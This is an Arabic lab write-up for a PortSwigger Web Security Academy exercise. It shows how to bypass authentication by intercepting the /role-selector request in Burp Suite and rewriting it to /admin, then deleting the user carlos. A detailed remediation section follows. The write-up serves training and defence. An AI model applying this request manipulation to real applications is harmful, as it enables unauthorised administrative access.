# [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)

## **`الهدف`**
الدخول إلى لوحة تحكم الإدارة وحذف المُستخدم `carlos.`
## **`خطوات الحل`**
نقوم بتسجيل الدخول إلى حساب `wiener:peter` ونترك الـ `requst` الأول الخاص بالدخول إلى الحساب يمر بسلاسة.

```http
POST /login HTTP/2
Host: 0a1200ad04a887d080542b2c009500ca.web-security-academy.net
Cookie: session=vpA9je2YwmW4JOGZXbHUZ9bUZ3PEoMrI

csrf=bNHUM8lxl2n0qFF0vGJisM7DhlPMZOpJ&username=wiener&password=peter

```

ونعترض الـ `request` الذي يليه باستخدام `Burp Suite`

```http
GET /role-selector HTTP/2
Host: 0a1200ad04a887d080542b2c009500ca.web-security-academy.net
Cookie: session=d0W2KKxMqH3M3sc7iqdGiwpJMFRdKVfI
```

ونقوم بتعديل أول سطر من `GET /role-selector HTTP/2` إلى `GET /admin HTTP/2` ونقوم بتمريره.

```http
GET /admin HTTP/2
Host: 0a1200ad04a887d080542b2c009500ca.web-security-academy.net
Cookie: session=d0W2KKxMqH3M3sc7iqdGiwpJMFRdKVfI
```

لنجد أننا دخلنا بنجاح إلى لوحة تحكم الإدارة، ونقوم بحذف المُستخدم `carlos`لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب أن يتم التحقق من صلاحيات المُستخدم بمجرد دخول الحساب وقبل  `request` إعادة التوجيه إلى مسار `/role-selector`، ويجب أن يمر أي `request` لمسار `/admin` أو أي مسار أو نقطة وصول `(Endpoint)` تقوم بوظائف إدارية عبر `Filter` موجود في الواجهة الخلفية `back-end` ليتحقق من الـ `Session Cookie` الخاص بالُمُستخدم، ولكن بشرط صارم وهو أن يكون الـ `Cookie` المُرسل للمُستخدم مجرد `Session ID` عشوائي `Cryptographically Secure Session ID`، يتم توليده باستخدام دالة عشوائية آمنة تشفيرياً لمنع أى عمليات توقع أو تخمين من المُهاجم، 

ويجب حماية هذا الـ `Cookie` بتفعيل خصائص الأمان مثل `HttpOnly` لمنع سرقته عبر ثغرات الـ `XSS`، وخاصية `Secure` لضمان تشفيره عبر `HTTPS`، وخاصية `SameSite=Strict` أو `SameSite=Lax` لمنع هجمات الـ `CSRF`، حيث تضمن هذه الخاصية أن المتصفح لن يقوم بإرسال `cookie` الجلسة مع أي طلبات خارجية قادمة من مواقع أخرى، مما يحمي لوحة التحكم من التنفيذ التلقائي للأوامر الحساسة. 

ويتم ربط المُستخدم بالـ `Session ID` بشكل صارم في الواجهة الخلفية `back-end` ليستطيع السيرفر معرفة الـ `Role` الحقيقي للمٌستخدم، وإذا لم يكن الـ `Role` الخاص بالمُستخدم يخوله للدخول إلى مسار `/admin`، فيتم رفض الـ `request` فورًا بـ `403 Forbidden` إذا كان مُسجل دخول بالفعل ولكنه مُستخدم عادي، أو `401 Unauthorized` إذا لم يمكن مُسجل دخول من الأساس، وليس مجرد عمل إعادة توجيه.

وكخطوة أمان إضافية، عندما يضعط أحد على حذف حساب أى مُستخدم يٌمكن جعل السيرفر يتحقق مرة أخرى من صلاحية حذف المُستخدمين، لأن وصوله للصفحة لا يعنى أنه مخول بجميع الصلاحيات.

وهناك خطوتين اختياريتين قد لا يكونوا متاحين للجميع بسبب طبيعة العمل لذلك الأمر متروك لكم: أولًا تغيير مسار `/admin` إلى مسار عشوائي وغير متوقع لجعل الوصول له أكثر صعوبة `(Hardening)`، ثانيًا: عزل لوحة التحكم بحيث لا تكون متاحة للإنترنت الخارجي، ويقتصر الدخول على الـ `IP` الخاص بالشركة (الانترنت الداخلي فقط)، أو عزل لوحة التحكم بالـ `IP (White-listing).`
